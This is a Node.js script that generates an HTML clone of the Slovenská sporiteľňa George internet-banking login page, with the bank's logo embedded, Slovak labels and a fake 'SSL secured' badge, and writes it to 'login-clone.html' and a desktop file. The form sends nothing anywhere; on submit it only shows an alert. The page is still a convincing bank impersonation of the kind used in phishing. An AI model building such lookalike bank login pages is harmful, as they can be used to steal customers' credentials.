import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const logoPath = path.join(__dirname, '../public/images/slsp-logo-blue.png');
const logoB64 = fs.readFileSync(logoPath).toString('base64');

const htmlContent = `<!DOCTYPE html>
<html lang="sk">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Prihlásenie do George internetbankingu | Slovenská sporiteľňa</title>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
    }

    body {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #f4f6fa;
      padding: 24px;
      color: #1e293b;
    }

    .login-card {
      width: 100%;
      max-width: 440px;
      background: #ffffff;
      border-radius: 18px;
      box-shadow: 0 18px 45px -8px rgba(15, 23, 42, 0.08), 0 2px 6px rgba(0, 0, 0, 0.02);
      padding: 48px 40px 36px 40px;
      display: flex;
      flex-direction: column;
      position: relative;
    }

    .logo-container {
      display: flex;
      justify-content: center;
      align-items: center;
      margin-bottom: 26px;
    }

    .logo-badge {
      width: 154px;
      height: auto;
      border-radius: 8px;
      display: block;
      object-fit: contain;
    }

    .title {
      font-size: 17.5px;
      font-weight: 500;
      color: #1e293b;
      text-align: center;
      margin-bottom: 24px;
      letter-spacing: -0.2px;
    }

    .form-group {
      position: relative;
      margin-bottom: 14px;
    }

    .form-input {
      width: 100%;
      height: 48px;
      background: #fdfefe;
      border: 1.5px solid #d4dce7;
      border-radius: 10px;
      font-size: 14.5px;
      color: #1e293b;
      outline: none;
      transition: border-color 0.2s, box-shadow 0.2s, background 0.2s;
    }

    .form-input::placeholder {
      color: #8290a2;
      font-weight: 400;
    }

    .form-input:focus {
      border-color: #1a71e8;
      box-shadow: 0 0 0 3px rgba(26, 113, 232, 0.12);
      background: #ffffff;
    }

    .input-with-left-icon {
      padding: 0 16px 0 44px;
    }

    .input-with-right-icon {
      padding: 0 44px 0 16px;
    }

    .input-icon-left {
      position: absolute;
      left: 15px;
      top: 50%;
      transform: translateY(-50%);
      color: #8593a4;
      display: flex;
      align-items: center;
      pointer-events: none;
    }

    .input-icon-right {
      position: absolute;
      right: 14px;
      top: 50%;
      transform: translateY(-50%);
      color: #8593a4;
      display: flex;
      align-items: center;
      cursor: pointer;
      padding: 4px;
      border-radius: 6px;
      background: none;
      border: none;
      transition: color 0.15s;
    }

    .input-icon-right:hover {
      color: #475569;
    }

    .options-row {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin: 14px 0 24px 0;
      font-size: 13.5px;
    }

    .checkbox-container {
      display: flex;
      align-items: center;
      gap: 8px;
      cursor: pointer;
      user-select: none;
      color: #334155;
    }

    .checkbox-container input[type="checkbox"] {
      width: 16px;
      height: 16px;
      accent-color: #1a71e8;
      border: 1.5px solid #cbd5e1;
      border-radius: 4px;
      cursor: pointer;
    }

    .forgot-link {
      color: #1a71e8;
      text-decoration: none;
      font-weight: 500;
      transition: color 0.15s;
    }

    .forgot-link:hover {
      text-decoration: underline;
      color: #145dbf;
    }

    .btn-submit {
      width: 100%;
      height: 48px;
      background: #1971e7;
      color: #ffffff;
      border: none;
      border-radius: 10px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      box-shadow: 0 8px 18px -2px rgba(25, 113, 231, 0.45);
      transition: all 0.2s ease;
      margin-bottom: 28px;
      display: flex;
      align-items: center;
      justify-content: center;
      letter-spacing: -0.1px;
    }

    .btn-submit:hover {
      background: #1463cf;
      box-shadow: 0 10px 22px -2px rgba(25, 113, 231, 0.55);
      transform: translateY(-1px);
    }

    .btn-submit:active {
      transform: translateY(0);
      box-shadow: 0 4px 12px -2px rgba(25, 113, 231, 0.4);
    }

    .footer-row {
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-size: 13px;
    }

    .footer-text {
      color: #475569;
      display: flex;
      align-items: center;
      gap: 4px;
      flex-wrap: wrap;
    }

    .register-link {
      color: #1a71e8;
      text-decoration: none;
      font-weight: 500;
      display: inline-flex;
      align-items: center;
      gap: 3px;
    }

    .register-link:hover {
      text-decoration: underline;
    }

    .ssl-badge {
      width: 24px;
      height: 26px;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #94a3b8;
      flex-shrink: 0;
    }
  </style>
</head>
<body>
  <div class="login-card">
    <div class="logo-container">
      <img class="logo-badge" src="data:image/png;base64,${logoB64}" alt="Slovenská sporiteľňa" />
    </div>

    <h1 class="title">Prihlásenie do George internetbankingu</h1>

    <form id="loginForm" onsubmit="event.preventDefault(); alert('Prihlasovacie údaje odoslané');">
      <!-- Username / Email Field -->
      <div class="form-group">
        <span class="input-icon-left">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
            <rect width="20" height="16" x="2" y="4" rx="2.5" />
            <path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7" />
          </svg>
        </span>
        <input
          type="text"
          class="form-input input-with-left-icon"
          placeholder="E-mailová adresa alebo ID"
          autocomplete="username"
          required
        />
      </div>

      <!-- Password Field -->
      <div class="form-group">
        <input
          type="password"
          id="passwordInput"
          class="form-input input-with-right-icon"
          placeholder="Heslo"
          autocomplete="current-password"
          required
        />
        <button
          type="button"
          id="togglePasswordBtn"
          class="input-icon-right"
          aria-label="Zobraziť heslo"
        >
          <svg id="eyeIcon" width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
            <path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z" />
            <circle cx="12" cy="12" r="3" />
          </svg>
        </button>
      </div>

      <!-- Options Row -->
      <div class="options-row">
        <label class="checkbox-container">
          <input type="checkbox" id="rememberMe" />
          <span>Zapamätať prihlásenie</span>
        </label>
        <a href="#" class="forgot-link">Zabudnuté heslo?</a>
      </div>

      <!-- Submit Button -->
      <button type="submit" class="btn-submit">
        Prihlásiť sa cez George kľúč
      </button>
    </form>

    <!-- Footer Row -->
    <div class="footer-row">
      <div class="footer-text">
        Nemáte ešte účet?
        <a href="#" class="register-link">
          Otvoriť účet online
          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
            <path d="m6 9 6 6 6-6" />
          </svg>
        </a>
      </div>
      <div class="ssl-badge" title="Zabezpečené 256-bitovým šifrovaním SSL">
        <svg width="22" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round">
          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
          <rect x="9.5" y="11" width="5" height="4.5" rx="0.8" stroke-width="1.4" />
          <path d="M10.5 11V9.5a1.5 1.5 0 0 1 3 0V11" stroke-width="1.4" />
        </svg>
      </div>
    </div>
  </div>

  <script>
    // Toggle password visibility
    const pwdInput = document.getElementById("passwordInput");
    const toggleBtn = document.getElementById("togglePasswordBtn");
    const eyeIcon = document.getElementById("eyeIcon");

    let isPasswordVisible = false;
    toggleBtn.addEventListener("click", () => {
      isPasswordVisible = !isPasswordVisible;
      pwdInput.type = isPasswordVisible ? "text" : "password";
      eyeIcon.innerHTML = isPasswordVisible
        ? '<path d="M9.88 9.88a3 3 0 1 0 4.24 4.24" /><path d="M10.73 5.08A10.43 10.43 0 0 1 12 5c7 0 10 7 10 7a13.16 13.16 0 0 1-1.67 2.68" /><path d="M6.61 6.61A13.526 13.526 0 0 0 2 12s3 7 10 7a9.74 9.74 0 0 0 5.39-1.61" /><line x1="2" x2="22" y1="2" y2="22" />'
        : '<path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z" /><circle cx="12" cy="12" r="3" />';
    });
  </script>
</body>
</html>
`;

fs.writeFileSync(path.join(__dirname, '../public/login-clone.html'), htmlContent, 'utf8');
try {
  fs.writeFileSync('C:/Users/42195/Desktop/georg_login_clone.html', htmlContent, 'utf8');
} catch (e) {
  console.log('Desktop write skipped:', e.message);
}
console.log('Refined login clone HTML generated successfully!');
